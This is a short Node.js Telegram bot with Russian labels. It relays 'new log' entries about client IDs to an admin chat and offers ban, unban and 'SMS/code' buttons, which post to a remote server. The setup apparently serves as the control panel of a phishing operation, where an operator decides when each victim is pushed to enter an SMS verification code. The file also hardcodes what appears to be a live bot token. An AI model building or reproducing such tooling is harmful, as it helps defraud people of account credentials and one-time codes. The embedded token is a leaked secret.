const TelegramBot = require("node-telegram-bot-api");
const fetch = require("node-fetch");

const token = "8589160707:AAEHCqUhzfom1D3_gtlG5eTiIrtPnXCGnNk";
const server = "https://ban-server-production.up.railway.app";

const bot = new TelegramBot(token, { polling: true });

// 📩 отправка заявки админу
function sendToAdmin(chatId, clientId, text) {
  bot.sendMessage(chatId,
`Новый Лог

ID: ${clientId}
${text}`,
  {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "🚫 Бан", callback_data: "ban_" + clientId },
          { text: "✅ Разбан", callback_data: "unban_" + clientId }
        ],
        [
          { text: "➡️ СМС/КОД", callback_data: "allow_" + clientId }
        ]
      ]
    }
  });
}

// 🔘 обработка кнопок
bot.on("callback_query", async (q) => {
  const data = q.data;
  const id = data.split("_")[1];

  if (data.startsWith("ban_")) {
    await fetch(server + "/ban", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ id })
    });
  }

  if (data.startsWith("unban_")) {
    await fetch(server + "/unban", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ id })
    });
  }

  if (data.startsWith("allow_")) {
    await fetch(server + "/allow", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ id })
    });
  }

  bot.answerCallbackQuery(q.id);
});

console.log("Bot started");
